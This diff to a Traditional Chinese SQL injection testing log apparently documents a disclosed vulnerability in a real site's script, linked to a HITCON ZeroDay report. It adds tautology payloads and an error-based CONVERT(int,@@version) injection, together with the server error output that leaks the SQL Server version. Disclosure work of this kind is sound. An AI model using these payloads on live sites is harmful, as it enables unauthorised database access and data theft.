@@ -79,3 +79,29 @@ Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'
 
 /Scripts/DataList_WOWdetail.js, 行318
 ```
+
+8. `' OR '1' = '1`
+
+成功搜尋到
+
+9. `' AND '1' = '1`
+
+成功搜尋到 0 筆資料，推測應該是我們還在某個 `'` 或是 `)` 裡面，所以註解沒有生效
+
+10. `' AND 1 = CONVERT(int,@@version) OR '1' = '1`
+
+```
+Microsoft OLE DB Provider for SQL Server 錯誤 '80040e07'
+
+將 nvarchar 值 'Microsoft SQL Server 2008 (SP4) - 10.0.6000.29 (X64) Sep 3 2014 04:11:34 Copyright (c) 1988-2008 Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) ' 轉換成資料類型 int 時，轉換失敗。
+
+/Scripts/DataList_WOWdetail.js, 行318
+```
+
+成功提取到 DB 版本號
+
+```
+Microsoft SQL Server 2008 (SP4) - 10.0.6000.29 (X64) Sep 3 2014 04:11:34 Copyright (c) 1988-2008 Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)
+```
+
+11. 接下來請參考 [ZD-2025-01031](https://zeroday.hitcon.org/vulnerability/ZD-2025-01031)
